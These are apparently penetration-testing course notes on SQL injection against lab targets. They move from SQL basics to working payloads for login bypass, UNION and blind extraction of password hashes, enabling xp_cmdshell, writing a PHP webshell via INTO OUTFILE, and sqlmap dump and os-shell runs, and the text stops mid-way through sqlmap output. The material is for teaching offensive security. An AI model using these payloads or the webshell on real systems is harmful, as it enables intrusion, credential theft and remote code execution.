# SQL Injection Attacks
_SQL injection_ (SQLi) is a major web application vulnerability class prevalent in many web applications
+ It is currently ranked third among _OWASP's Top10_ Application Security Risks
+ In general, SQLi vulnerabilities enable attackers to meddle with SQL queries exchanged between the web application and database
+ QL vulnerabilities typically allow the attacker to extend the original application query to include database tables that would normally be inaccessible

## SQL Theory and Database 

### Theory Refresher 
_Structured Query Language_ (SQL) has been developed specifically to manage and interact with data stored inside _relational databases_
+ SQL can be employed to query, insert, modify, or even delete data and, in some cases, execute operating system commands
+ Since the SQL instance offers so many administrative privileges, we'll soon observe how arbitrary SQL queries can pose a significant security risk

Modern web applications are usually designed around a user-facing interface referred to as the _frontend_, which is typically created using different code blocks written in HTML, CSS, and JavaScript

After the client interacts with the frontend, it sends data to the _backend_ application layer that is running on the server
+ A number of different frameworks can be used to construct a backend application, written in various languages including PHP, Java, and Python

Next, the backend code interacts with the data residing in the database in various ways, such as retrieving the password associated with a given username

SQL syntax, commands, and functions vary based on which relational database they were made for. _MySQL_, _Microsoft SQL Server_, _PostgreSQL_, and _Oracle_ are the most popular database implementations, and we are going to inspect each variant's characteristics

As an example, let's build a simple MySQL query to parse the _users_ table and retrieve a specific user entry
+ We can use the **SELECT** statement to instruct the database that we want to retrieve all (`*`) the records from a specific location defined via the **FROM** keyword and followed by the target, in this case the **users** table. Finally, we'll direct the database to filter only for records belonging to the user **leon**:
``` SQL
SELECT * FROM users WHERE user_name='leon'
```

To automate functionality, web applications often embed SQL queries within their source code
+ We can better understand this concept by examining the following backend PHP code portion that is responsible for verifying user-submitted credentials during login:
``` PHP
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

Highlighted above is a semi-precompiled SQL query that searches the users table for the provided username and its respective password, which are saved into the `uname` and`passwd` variables
+ The query string is then stored in `sql_query` and used to perform the query against the local database through the `mysqli_query` function, which saves the result of query in `$result`

So far, we've described a very basic interaction between backend PHP code and the database
+ Reviewing the above code snippet, we'll notice that both the _user_name_ and _password_ variables are retrieved from the user _POST_ request and inserted directly in the _sql_query_ string, without any prior check
+ This means that an attacker could modify the final SQL statement before it is executed by the SQL database
+ An attacker could insert a SQL statement inside the _user_ or _password_ field to subvert the intended application logic

Let's consider an example. When the user types **leon**, the SQL server searches for the username "leon" and returns the result. In order to search the database, the SQL server runs the query:
``` SQL
SELECT * FROM users WHERE user_name= leon
```

If, instead, the user enters `leon '+!@#$`, the SQL server will run the query:
``` SQL
SELECT * FROM users WHERE user_name= leon'+!@#$
```
+ Nothing in our code block checks for these special characters, and it's this lack of filtering that causes the vulnerability.

### DB Types and Characteristics 
When testing a web application, we sometimes lack prior knowledge of the underlying database system, so we should be prepared to interact with different SQL database variants
+ There are many DB variants that differ in syntax, function, and features
+ Will focus on two of the most common database variants, MySQL and Microsoft SQL Server (MSSQL)
	+ The two SQL variants we're exploring in this Module are not limited to on-premise installations, as they can often be found in cloud deployments

#### MySQL
_MySQL_ is one of the most commonly deployed database variants, along with _MariaDB_, an open-source fork of MySQL
+ To explore MySQL basics, we can connect to the remote MySQL instance from our local Kali machine
+ Using the **mysql** command, we'll connect to the remote SQL instance by specifying **root** as username and password, along with the default MySQL server port **3306**:
``` Shell
mysql -u <USER> -p'<PASS>' -h <IP> -P 3306
```
+ Example output:
```
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

From the MySQL console shell, we can run the _version()_ function to retrieve the version of the running SQL instance:
``` SQL
select version();
```
+ Example output:
``` SQL
+-----------+
| version() |
+-----------+
| 8.0.21    |
+-----------+
1 row in set (0.107 sec)
```

Can also verify the current database user for the ongoing session via the _system_user()_ function, which returns the current username and hostname for the MySQL connection
``` SQL
select system_user();
```
+ Example output:
``` SQL
+--------------------+
| system_user()      |
+--------------------+
| root@192.168.20.50 |
+--------------------+
1 row in set (0.104 sec)
```
+ The database query we ran confirmed that we are logged in as the database root user through a remote connection from `192.168.20.50` 
	+ **Note**: The _root_ user in this example is the database-specific root user, not the the system-wide administrative root user

We can now collect a list of all databases running in the MySQL session by issuing the **show** command, followed by the **databases** keyword
``` SQL
show databases;
```
+ Example output:
``` SQL
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+
5 rows in set (0.107 sec)
```

Can show all tables in a database by doing: 
``` SQL
SHOW TABLES FROM <DATABASE_NAME>
```

Can show all columns in a table with:
``` SQL
SHOW COLUMNS FROM <DATABASE_NAME>.<TABLE_NAME>;
```

As an example, let's retrieve the password of the _offsec_ user present in the _mysql_ database.
+ Within the mysql database, we'll filter using a **SELECT** statement for the **user** and **authentication_string** value belonging to the **user** table
+ Next, we'll filter all the results via a **WHERE** clause that matches only the **offsec** user:
``` SQL
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```
+ Example output:
``` SQL
+--------+------------------------------------------------------------------------+
| user   | authentication_string                                                  |
+--------+------------------------------------------------------------------------+
| offsec | $A$005$?qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6|
+--------+------------------------------------------------------------------------+
1 row in set (0.106 sec)
```
+ To improve its security, the user's password is stored in the `authentication_string` field as a _Caching-SHA-256_ algorithm 
	+ A password hash is a ciphered representation of the original plain-text password

#### MSSQL
Having covered the basics of MySQL, let's explore MSSQL
+ MSSQL is a database management system that natively integrates into the Windows ecosystem

A built-in command-line tool named <mark style="background: #D2B3FFA6;">SQLCMD</mark> allows SQL queries to be run through the *Windows* command prompt or even remotely from another machine

Kali Linux includes <mark style="background: #D2B3FFA6;">Impacket</mark> a Python framework that enables network protocol interactions
+ Among many other protocols, it supports Tabular Data Stream(TDS),[7](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/sql-injection-attacks/sql-theory-and-databases/db-types-and-characteristics#fn7) the protocol adopted by MSSQL that is implemented in the <mark style="background: #D2B3FFA6;">impacket-mssqlclient</mark> tool 
+ Can run `impacket-mssqlclient` to connect to the remote Windows machine running MSSQL by providing a username, a password, and the remote IP, together with the `-windows-auth` keyword
	+ This forces NTLM authentication (as opposed to Kerberos)
+ Usage:
``` Shell
impacket-mssqlclient <USER>:<PASS>@<IP> -windows-auth
```
+ Example output:
``` SQL
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL>
```

To begin, let's inspect the current version of the underlying operating system by selecting the `@@version`:
``` SQL
SELECT @@version;
```
+ Example output:
``` SQL
...

Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
	Sep 24 2019 13:48:23
	Copyright (C) 2019 Microsoft Corporation
	Express Edition (64-bit) on Windows Server 2022 Standard 10.0 <X64> (Build 20348: ) (Hypervisor)
```
+ Our query returned valuable information about the running version of the MSSQL server along with the Windows Server version, including its build number
+ **Note**: When using a SQL Server command line tool like sqlcmd, we must submit our SQL statement ending with a semicolon followed by _GO_ on a separate line. However, when running the command remotely, we can omit the GO statement since it's not part of the MSSQL TDS protocol.

To list all the available databases, we can select all names from the system catalog:
+ Usage: 
``` SQL
SELECT name FROM sys.databases;
```
+ Example output:
``` SQL
name
...
master

tempdb

model

msdb

offsec

SQL>
```

Since _master_, _tempdb_, _model_, and _msdb_ are default databases, we want to explore the custom _offsec_ database because it might contain data belonging to our target
+ Can review this database by querying the _tables_ table in the corresponding `information_schema`, Usage:
``` SQL
SELECT * FROM offsec.information_schema.tables;
```
+ Example output:
``` SQL
TABLE_CATALOG                                                                  TABLE_SCHEMA                                                                     TABLE_NAME                                                                       TABLE_TYPE
offsec
dbo
users
b'BASE TABLE'
```
+ Our query returned the _users_ table as the only one available in the database, so let's inspect it by selecting all of its records
	+ We'll need to specify the _dbo_ table schema between the database and the table names, Usage:
``` SQL
select * from offsec.dbo.users;
```
+ Example output:
``` SQL
username         password

----------   ----------

admin        lab

guest        guest
```
+ The users table contains two columns, _user_ and _password_, and two rows
+ Our query returned the clear text password for both usernames

## Manual SQL Exploitation 
Having covered the basic SQL syntax of two major database distributions, let's explore how to identify and exploit SQL injection vulnerabilities
+ SQL injections are often discovered and abused using automated tools such as <mark style="background: #D2B3FFA6;">sqlmap</mark>
+ Nevertheless, we should first understand how to manually trigger a vulnerability to grasp its mechanics

### Identifying SQLi via Error-based Payloads 
Can start our vulnerability analysis using the PHP code we inspected previously:
``` PHP
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```
+ Since both the `uname` and `password` parameters come from user-supplied input, we can control the `$sql_query` variable and craft a different SQL query
+ In some cases, SQL injection can lead to authentication bypass, which is the first exploitation avenue we'll explore

By forcing the closing quote on the `uname` value and adding an `OR 1=1` statement followed by a `--` comment separator and two forward slashes (`//`), we can prematurely terminate the SQL statement
+ The syntax for this type of of comment requires two consecutive dashes followed by at least one whitespace character
+ In this section's examples we are trailing these comments with two double slashes
+ This provides *visibility* on our payload, and also adds some protection against any kind of whitespace truncation the web application might employ
``` SQL
offsec' OR 1=1 -- //
```

The SQL query assigned to the `$sql_query` variable results in the SQL query below being forwarded from the PHP application to the MySQL server
``` SQL
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
```

Since we have appended an OR statement that will always be true, the WHERE clause will return the first user id present in the database, whether or not the user record is present
+ Because no other checks are implemented in the application, we are able to gain administrator privileges by circumventing the authentication logic

To experiment with this attack against a real application, we can browse to `http://192.168.50.16` from our local Kali machine, enter "offsec" and "jam" in the respective username and password fields, and click _Submit_:
![[Pasted image 20230905224010.png]]
+ Because the offsec user's credentials are invalid, we receive an _Invalid Password_ error message
+ As a next step, let's try to insert any special character inside the _Username_ field to test for any interaction with the underlying SQL server

We'll append a single quote to the username and click _Submit_ again
![[Pasted image 20230905224036.png]]
+ We receive an SQL syntax error this time, meaning we are able to interact with the database
+ **Note**: SQL injection is considered _in-band_ when the vulnerable application provides the result of the query along with the application-returned value. In this scenario, we've enabled SQL debugging inside the web application; however, most production-level web applications won't show these error messages because revealing SQL debugging information is considered a security flaw

Given the above conditions, let's test the authentication payload we discussed earlier by pasting it inside the _Username_ field:
![[Pasted image 20230905224123.png]]
+ And then click submit again:
![[Pasted image 20230905224132.png]]
+ We received an _Authentication Successful_ message, meaning that our attack succeeded

To further expand on our attack, we could also take advantage of the error-based payload by enumerating the database directly
+ By prematurely terminating the implied SQL query again, we can inject an arbitrary second statement:
``` SQL
' or 1=1 in (select @@version) -- //
```
+ In this case, we want to retrieve the MySQL version via the _@@version_ directive
	+ **Note**: MySQL accepts both _version()_ and _@@version_ statements

We can now paste the injection payload in the _Username_ field and verify the returned output:
![[Pasted image 20230905224255.png]]
+ The running MySQL version (8.0.28) is included along with the rest of the web application payload
+ This means we can query the database interactively, similar to how we would use an administrative terminal

As it seems we have unbounded control over database queries, let's try to dump all the data inside the _users_ table: 
``` SQL
' OR 1=1 in (SELECT * FROM users) -- //
```

After inserting the value into the _Username_ field and submitting the query, we receive the following error:
![[Pasted image 20230905224346.png]]

This means that we should only query one column at a time. Let's try to grab only the _password_ column from the _users_ table:
``` SQL
' or 1=1 in (SELECT password FROM users) -- //
```
![[Pasted image 20230905224424.png]]
+ This is somewhat helpful, as we managed to retrieve all user password hashes; however, we don't know which user each password hash corresponds to

Can solve the issue by adding a _WHERE_ clause specifying which user's password we want to retrieve, in this case _admin_:
``` SQL
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```
 + Once we submit the payload, we receive the user's password along with the usual error message:
![[Pasted image 20230905224514.png]]
+ We managed to predictably fetch hashed user credentials via the error-based SQL injection vulnerability we discovered

### UNION-based Payloads 
Whenever we're dealing with in-band SQL injections and the result of the query is displayed along with the application-returned value, we should also test for _UNION-based_ SQL injections

For **UNION** SQLi attacks to work, we first need to satisfy two conditions:
1. The injected **UNION** query has to include the same number of columns as the original query.
2. The data types need to be compatible between each column.

To demonstrate this concept, let's test a web application with the following preconfigured SQL query:
``` PHP 
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

The query fetches all the records from the _customers_ table
+ It also includes the **LIKE** keyword to search any _name_ values containing our input that are followed by zero or any number of characters, as specified by the percentage (_%_) operator
+ There are two wildcards often used in conjunction with the `LIKE` operator:
	-  The percent sign `%` represents zero, one, or multiple characters
	-  The underscore sign `_` represents one, single character
+ For example, the following will find all customers that start with a letter "a":
``` SQL
-- The following will find all customers that start with a letter "a":
SELECT * FROM Customers  
WHERE CustomerName LIKE 'a%';

-- Return all customers from a city that starts with 'L' followed by one wildcard character, then 'nd' and then two wildcard characters:
SELECT * FROM Customers  
WHERE city LIKE 'L_nd__';
```

can interact with the vulnerable application by browsing to `http://192.168.50.16/search.php` from our Kali machine
+ Once the page is loaded, we can click _SEARCH_ to retrieve all data from the _customers_ table
![[Pasted image 20230906092306.png]]

Before crafting any attack strategy, we need to know the exact number of columns present in the target table
+ Although the above output shows that four columns are present, we should not assume based on the application layout, as there may be extra columns
+ To discover the correct number of columns, we can submit the following injected query into the search bar:
``` SQL
' ORDER BY 1-- //
' ORDER BY 2-- //
' ORDER BY 3-- //
' ORDER BY 4-- //
' ORDER BY 5-- //
' ORDER BY 6-- //
```
+ The above statement orders the results by a specific column, meaning it will fail whenever the selected column does not exist
+ *Increasing the column value by one each time*, we'll discover that the table has five columns, since ordering by column six returns an error
![[Pasted image 20230906092437.png]]

With this information in mind, we can attempt our first attack by enumerating the current database name, user, and MySQL version:
``` SQL
%' UNION SELECT database(), user(), @@version, null, null -- //
```
+ Since we want to retrieve all the data from the _customers_ table, we'll use the percentage sign followed by a single quote to close the search parameter
+ Then, we begin our injected query with a **UNION SELECT** statement that dumps the current database name, the user, and the MySQL version in the first, second, and third columns, respectively, leaving the remaining two null:
![[Pasted image 20230906092917.png]]

After launching our attack, we'll notice that the username and the DB version are present on the last line, but the current database name is not
+ This happens because column 1 is typically reserved for the ID field consisting of an _integer_ data type, meaning it cannot return the string value we are requesting through the _SELECT database()_ statement
+ **Note**: The web application is explicitly omitting the output from the first column because IDs are not usually useful information for end users

With this in mind, let's update our query by shifting all the enumerating functions to the right-most place, avoiding any type mismatches:
``` SQL
' UNION SELECT null, null, database(), user(), @@version  -- //
```
+ Since we already verified the expected output, we can omit the percentage sign and rerun our modified query:
![[Pasted image 20230906093127.png]]
+ This time, all three values returned correctly, including _offsec_ as the current database name

Let's extend our tradecraft and verify whether other tables are present in the current database
+ We can start by enumerating the _information schema_ of the current database from the _information_schema.columns_ table
+ We'll attempt to retrieve the _columns_ table from the _information_schema_ database belonging to the current database
+ We'll then store the output in the second, third, and fourth columns, leaving the first and fifth columns null:
``` SQL
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

Running our new enumeration attempt results in the below output:
![[Pasted image 20230906093237.png]]
+ This output verifies that the three columns contain the table name, the column name, and the current database, respectively
+ Interestingly, we discovered a new table named _users_ that contains four columns, including one named _password_

Let's craft a new query to dump the _users_ table:
``` SQL
' UNION SELECT null, username, password, description, null FROM users -- //
```
+ Using the above statement, we'll again attempt to store the output of the username, password, and description in the web application table
![[Pasted image 20230906093353.png]]
+ Great! Our UNION-based payload was able to fetch the usernames and MD5 hashes of the entire users table, including an administrative account
+ These _MD5_ values are encrypted versions of the plain-text passwords, which can be reversed using appropriate tools

### Blind SQL Injection 
The SQLi payloads we have encountered are _in-band_, meaning we're able to retrieve the database content of our query inside the web application
+ Alternatively, _blind_ SQL injections describe scenarios in which database responses are never returned and behavior is inferred using either boolean- or time-based logic

As an example, generic boolean-based blind SQL injections cause the application to return different and predictable values whenever the database query returns a TRUE or FALSE result, hence the "boolean" name
+ These values can be reviewed within the application context
+ Although "boolean-based" might not seem like a blind SQLi variant, the output used to infer results comes from the web application, not the database itself

Time-based blind SQL injections infer the query results by instructing the database to wait for a specified amount of time
+ Based on the response time, the attacker is able to conclude if the statement is TRUE or FALSE

Our vulnerable application `http://192.168.50.16/blindsqli.php` includes a code portion affected by both types of blind SQL injection vulnerabilities
+ Once we have logged in with the _offsec_ and _lab_ credentials, we'll encounter the following page:
![[Pasted image 20230906094410.png]]

Closely reviewing the URL, we'll notice that the application takes a _user_ parameter as input, defaulting to _offsec_ since this is our current logged-in user
+ The application then queries the user's record, returning the _Username_, _Password Hash_, and _Description_ values
+ To test for boolean-based SQLi, we can try to append the below payload to the URL:
``` SQL
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

Since `1=1` will always be TRUE, the application will return the values only if the user is present in the database
+ Using this syntax, we could enumerate the entire database for other usernames or even extend our SQL query to verify data in other tables
+ We can achieve the same result by using a time-based SQLi payload:
``` SQL
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
+ In this case, we appended an IF condition that will always be true inside the statement itself, but will return false if the user is non-existent

We know the user _offsec_ is active, so we if paste the above URL payload in our Kali VM's browser, we'll notice that the application hangs for about three seconds
+ This attack angle can clearly become very time consuming, so it's often automated with tools like <mark style="background: #D2B3FFA6;">sqlmap</mark>, as we'll cover in the next Learning Unit

## Manual and Automated Code Execution 
Depending on the operating system, service privileges, and filesystem permissions, SQL injection vulnerabilities can be used to read and write files on the underlying operating system
+ Writing a carefully crafted file containing PHP code into the root directory of the web server could then be leveraged for full code execution

### Manual Code Execution 
Depending on the underlying database system we are targeting, we need to adapt our strategy to obtain code execution

#### MSSQL
In *Microsoft SQL Server*, the `xp_cmdshell` function takes a string and passes it to a command shell for execution
+ The function returns any output as rows of text
+ The function is disabled by default and, once enabled, it must be called with the **EXECUTE** keyword instead of SELECT

In our database, the _Administrator_ user already has the appropriate permissions
+ Let's enable `xp_cmdshell` by simulating a SQL injection via the <mark style="background: #D2B3FFA6;">impacket-mssqlclient</mark> tool:
``` Shell
impacket-mssqlclient <USER>:<PASS>@<IP> -windows-auth
```
+ With a shell will do the the following commands to enable `xp_cmdshell`:
``` SQL
SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
```
+ Example:
``` SQL
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL> RECONFIGURE;

SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL> RECONFIGURE;
```
+ After logging in from our Kali VM to the MSSQL instance, we can enable _show advanced options_ by setting its value to 1, then applying the changes to the running configuration via the **RECONFIGURE** statement 
+ Next, we'll enable _xp_cmdshell_ and apply the configuration again using **RECONFIGURE**

With this feature enabled, we can execute any Windows shell command through the **EXECUTE** statement followed by the feature name:
``` SQL
SQL> EXECUTE xp_cmdshell 'whoami';
output

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

nt service\mssql$sqlexpress

NULL
```
+ Since we have full control over the system, we can now easily upgrade our SQL shell to a more standard reverse shell

#### MySQL  
Although the various MySQL database variants don't offer a single function to escalate to RCE, we _can_ abuse the `SELECT INTO_OUTFILE` statement to write files on the web server
+ **Note**: For this attack to work, the file location must be writable to the OS user running the database software

As an example, let's resume the **UNION** payload on our MySQL target application we explored previously, expanding the query that writes a _webshell_ on disk
+ We'll issue the **UNION SELECT** SQL keywords to include a single PHP line into the first column and save it as **webshell.php** in a writable web folder
``` SQL
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

The written PHP code file results in the following:
``` PHP
<? system($_REQUEST['cmd']); ?>
```

The PHP _system_ function will parse any statement included in the _cmd_ parameter coming from the client HTTP REQUEST, thus acting like a web-interactive command shell

If we try to use the above payload inside the _Lookup_ field of the **search.php** endpoint, we receive the following error
![[Pasted image 20230906161638.png]]
+ Fortunately, this error is related to the incorrect return type, and should not impact writing the webshell on disk
+ To confirm, we can access the newly created webshell inside the **tmp** folder along with the **id** command:
![[Pasted image 20230906161711.png]]
+ The webshell is working as expected, since the output of the _id_ command is returned to us through the web browser
+ We discovered that we are executing commands as the _www-data_ user, an identity commonly associated with web servers on Linux systems
+ Now that we understand how to leverage SQLi to manually obtain command execution, let's discover how to automate the process with specific tools

### Automating the Attack 
The SQL injection process we followed can be automated using several tools pre-installed on Kali Linux
+ In particular, <mark style="background: #D2B3FFA6;">sqlmap</mark> can identify and exploit SQL injection vulnerabilities against various database engines
+ run <mark style="background: #D2B3FFA6;">sqlmap</mark> on our sample web application. We will set the URL we want to scan with `-u` and specify the parameter to test using `-p`
+ Usage:
```
sqlmap -u http://<IP_OR_DOMAIN>/<PAGE>.php?<PARAM>=1 -p <PARAM>
```
+ Example:
```
kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

...
[*] starting @ 02:14:54 PM /2022-05-16/

[14:14:54] [INFO] resuming back-end DBMS 'mysql'
[14:14:54] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.50.16:80/login1.php?msg=2'. Do you want to follow? [Y/n]
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=fbf1f5fa5fc...a7266cba36'). Do you want to use those [Y/n]
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=1' AND (SELECT 1582 FROM (SELECT(SLEEP(5)))dTzB) AND 'hiPB'='hiPB
---
[14:14:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP, PHP 7.3.33, Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
[14:14:57] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.50.16'

[*] ending @ 02:14:57 PM /2022-05-16/
```

Submitted the entire URL after the _-u_ specifier together with the _?user_ parameter set to a dummy value
+ Once launched, we can press `Return` on the default options
+ <mark style="background: #D2B3FFA6;">Sqlmap</mark> then returns confirmation that we are dealing with a _time-based blind_ SQL injection and provides additional fingerprinting information such as the web server operating system, web application technology stack, and the backend database
+ Although the above command confirmed that the target URL is vulnerable to SQLi, we can extend our tradecraft by using <mark style="background: #D2B3FFA6;">sqlmap</mark> to dump the database table and steal user credentials
+ **Note**: Although sqlmap is a great tool to automate SQLi attacks, it provides next-to-zero stealth. Due to its high-volume of traffic, sqlmap should not be used as a first choice tool during assignments that require staying under the radar

#### Dump the Database
To *dump the entire database*, including user credentials, we can run the same command as earlier with the `--dump` parameter
+ Example:
```
kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump

```

```
[*] starting @ 02:23:49 PM /2022-05-16/

[14:23:49] [INFO] resuming back-end DBMS 'mysql'
[14:23:49] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.50.16:80/login1.php?msg=2'. Do you want to follow? [Y/n]
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=b7c9c962b85...c6c7205dd1'). Do you want to use those [Y/n]
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=1' AND (SELECT 1582 FROM (SELECT(SLEEP(5)))dTzB) AND 'hiPB'='hiPB
---
[14:23:52] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP, Apache 2.4.52, PHP 7.3.33
back-end DBMS: MySQL >= 5.0.12
[14:23:52] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[14:23:52] [INFO] fetching current database
[02:23:52 PM] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
[14:25:26] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[14:25:26] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)

[14:25:47] [INFO] adjusting time delay to 2 seconds due to good response times
offsec
[14:27:01] [INFO] fetching tables for database: 'offsec'
[14:27:01] [INFO] fetching number of tables for database 'offsec'

[02:27:01 PM] [INFO] retrieved: 2
[02:27:11 PM] [INFO] retrieved: customers
[02:29:25 PM] [INFO] retrieved: users
[14:30:38] [INFO] fetching columns for table 'users' in database 'offsec'
[02:30:38 PM] [INFO] retrieved: 4
[02:30:44 PM] [INFO] retrieved: id
[02:31:14 PM] [INFO] retrieved: username
[02:33:02 PM] [INFO] retrieved: password
[02:35:09 PM] [INFO] retrieved: description
[14:37:56] [INFO] fetching entries for table 'users' in database 'offsec'
[14:37:56] [INFO] fetching number of entries for table 'users' in database 'offsec'
[02:37:56 PM] [INFO] retrieved: 4
[02:38:02 PM] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[14:38:24] [INFO] adjusting time delay to 1 second due to good response times
this is the admin
[02:40:54 PM] [INFO] retrieved: 1
[02:41:02 PM] [INFO] retrieved: 21232f297a57a5a743894a0e4a801fc3
[02:46:34 PM] [INFO] retrieved: admin
[02:47:15 PM] [INFO] retrieved: try harder
[02:48:44 PM] [INFO] retrieved: 2
[02:48:54 PM] [INFO] retrieved: f9664ea1803311b35f

...
```

Since we're dealing with a blind time-based SQLi vulnerability, the process of fetching the entire database's table is quite slow, but eventually we manage to obtain all users' hashed credentials

Can specify specific databases, with `-D`
+ For example: `-D wordpress`

Can specify specific table with `-T`
+ For example: `-T wp_users`

+ When errors happen with commands on the same target, should flush the session with `--flush-session` 
+ Can try another flush technique with `--technique=T` for blind based SQL injections
	+ See the injection types for each:
		- B: Boolean-based blind
		- E: Error-based
		- U: Union query-based
		- S: Stacked queries
		- T: Time-based blind
		- Q: Inline queries

Example for modified dump:
```
sqlmap -u "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1" -p question_id -D wordpress -T wp_users --technique=T --dump --flush-session
```
#### OS Shell
Another <mark style="background: #D2B3FFA6;">sqlmap</mark> core feature is the `--os-shell` parameter, which provides us with a full interactive shell
+ Due to their generally high latency, time-based blind SQLi are not ideal when interacting with a shell, so we'll use the first UNION-based SQLi example

First, we need to intercept the POST request via Burp and save it as a local text file on our Kali VM
``` HTTP
POST /search.php HTTP/1.1
Host: 192.168.50.19
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://192.168.50.19
Connection: close
Referer: http://192.168.50.19/search.php
Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
Upgrade-Insecure-Requests: 1

item=test
```

Next, we can invoke <mark style="background: #D2B3FFA6;">sqlmap</mark> with the **-r** parameter, using our file containing the POST request as an argument
+ We also need to indicate which parameter is vulnerable to <mark style="background: #D2B3FFA6;">sqlmap</mark>, in our case `item`
+ Finally, we'll include **--os-shell** along with the custom writable folder we found earlier:
+ Example:
```
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```

```
...
[*] starting @ 02:20:47 PM /2022-05-19/

[14:20:47] [INFO] parsing HTTP request from 'post'
[14:20:47] [INFO] resuming back-end DBMS 'mysql'
[14:20:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: item (POST)
...
---
[14:20:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.6
[14:20:48] [INFO] going to use a web backdoor for command prompt
[14:20:48] [INFO] fingerprinting the back-end DBMS operating system
[14:20:48] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
[14:20:49] [INFO] using '/var/www/html/tmp' as web server document root
[14:20:49] [INFO] retrieved web server absolute paths: '/var/www/html/search.php'
[14:20:49] [INFO] trying to upload the file stager on '/var/www/html/tmp/' via LIMIT 'LINES TERMINATED BY' method
[14:20:50] [WARNING] unable to upload the file stager on '/var/www/html/tmp/'
[14:20:50] [INFO] trying to upload the file stager on '/var/www/html/tmp/' via UNION method
[14:20:50] [WARNING] expect junk characters inside the file as a leftover from UNION query
[14:20:50] [INFO] the remote file '/var/www/html/tmp/tmpuqgek.php' is larger (713 B) than the local file '/tmp/sqlmapxkydllxb82218/tmp3d64iosz' (709B)
